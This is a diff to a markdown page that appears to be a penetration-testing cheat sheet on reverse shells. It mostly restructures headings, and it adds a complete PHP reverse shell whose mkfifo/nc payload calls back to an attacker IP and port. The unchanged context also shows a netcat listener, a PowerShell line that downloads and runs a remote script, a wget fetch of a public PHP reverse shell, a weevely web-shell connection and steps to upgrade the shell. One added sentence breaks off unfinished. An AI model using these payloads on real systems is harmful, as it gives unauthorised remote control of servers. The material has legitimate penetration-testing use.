@@ -8,15 +8,13 @@ render_with_liquid: false
 
 ## Basic Flow
 
-1. **Open Listener in Your Local Machine**
+First of all, open listener in local machine.
 
-    First of all, you need to open listener in your local machine.
+```sh
+nc -lvnp 4444
+```
 
-    ```sh
-    nc -lvnp 4444
-    ```
-
-2. **Reverse Shell via Command Line**
+- **Reverse Shell via Command Line**
 
     - **Bash**
 
@@ -103,7 +101,7 @@ render_with_liquid: false
             cmd /c powershell IEX (New-Object Net.WebClient).DownloadString('http://<your-local-ip>:8000/shell.ps1')
             ```
 
-3. **Reverse Shell via Website**
+- **Reverse Shell via Website**
 
     -  **PHP Reverse Shell**
 
@@ -113,10 +111,46 @@ render_with_liquid: false
         wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
 
         # Edit $ip and $port to your local ip:port in the payload
-
         ```
 
+        Update $ip and $port in the payload to your local ip and port.
+
         Then upload the payload, or copy the content and paste to somewhere in the target website directly, and reload the page.
+
+    - **PHP Reverse Shell (without fsockopen, and for FreeBSD)**
+
+        If the target website validates 
+
+        ```php
+        <?php
+        set_time_limit (0);
+        $ip = '10.0.0.1';  // CHANGE THIS
+        $port = 4444;      // CHANGE THIS
+
+        // Spawn shell process
+        $descriptorspec = array(
+        0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+        1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+        2 => array("file", "/tmp/error-output.txt", "a")   // stderr is a pipe that the child will write to
+        );
+
+        $cwd = "/tmp";
+        $env = array('some_option' => 'aeiou');
+
+        $process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);
+
+        if (is_resource($process)) {
+            fwrite($pipes[0], 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f');
+            fclose($pipes[0]);
+
+            echo stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+
+            $return_value = proc_close($process);
+            echo "command returned $return_value\n";
+        }
+        ?>
+        ```
 
     - **Upload the Payload using SQLi**
 
@@ -151,24 +185,26 @@ render_with_liquid: false
                 weevely https://vulnerable.com/upload/shell.php <password>
                 ```
 
-4. **Upgrade to a Full Functional Shell**
+<br />
 
-    After successful reverse shell, it's recommended to make the shell to be more elegant.
+## Upgrade to a Full Functional Shell
 
-    ```sh
-    SHELL=/bin/bash script -q /dev/null
-    # or
-    python3 -c 'import pty; pty.spawn("/bin/bash")'
-    ```
+After connecting to target shell with reverse shell, it's recommended to make the shell to be more elegant.
 
-    The commands below make "your" shell even more perfect.
+```sh
+SHELL=/bin/bash script -q /dev/null
+# or
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
-    ```sh
-    Ctrl+z
-    stty raw -echo;fg
-    Enter x2
-    export TERM=xterm
-    ```
+The commands below make "your" shell even more perfect.
+
+```sh
+Ctrl+z
+stty raw -echo;fg
+Enter x2
+export TERM=xterm
+```
 
 <br />
 
